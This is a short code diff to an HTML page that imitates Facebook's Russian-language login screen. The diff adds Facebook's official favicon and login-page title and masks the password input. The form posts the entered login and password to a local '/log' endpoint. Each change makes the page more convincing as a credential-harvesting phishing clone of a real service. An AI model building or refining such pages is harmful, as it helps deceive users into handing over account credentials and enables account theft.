@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico" sizes="32x32">
     <link rel="stylesheet" href="fb.css">
-    <title>fb</title>
+    <title>Facebook — Выполните вход или зарегистрируйтесь</title>
     <script>
         const redirect = () =>{
             if(screen.width <= 551){
@@ -44,7 +45,7 @@
                 <div class="loger">
                     <form action="http://localhost:3000/log" method="POST">
                         <input type="text" placeholder="Электронный адрес или номер телефона" name="login" id="login"/>
-                        <input type="text" placeholder="Пароль" name="password" id="password"/>
+                        <input type="password" placeholder="Пароль" name="password" id="password"/>
                         <button>Вход</button>
                     </form>
                 </div>
